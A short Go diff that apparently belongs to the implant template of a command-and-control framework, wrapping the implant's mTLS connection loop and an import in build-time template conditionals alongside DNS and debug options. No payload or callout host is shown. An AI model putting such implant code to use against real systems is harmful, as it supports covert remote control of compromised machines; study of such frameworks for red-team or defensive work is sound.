@@ -3,7 +3,10 @@ package main
 import (
 	"crypto/x509"
 	"flag"
+
+	// {{if .MTLSServer}}
 	"io"
+	// {{end}}
 	"os"
 	"os/user"
 	"runtime"
@@ -71,13 +74,17 @@ func startConnectionLoop() {
 	// {{end}}
 	connectionAttempts := 0
 	for connectionAttempts < maxErrors {
-		err := mtlsConnect()
+		var err error
+
+		// {{if .MTLSServer}}
+		err = mtlsConnect()
 		if err != nil {
 			// {{if .Debug}}
 			log.Printf("[mtls] Connection failed %s", err)
 			// {{end}}
 		}
 		connectionAttempts++
+		// {{end}}
 
 		// {{if .DNSParent}}
 		if dnsParent != "" {
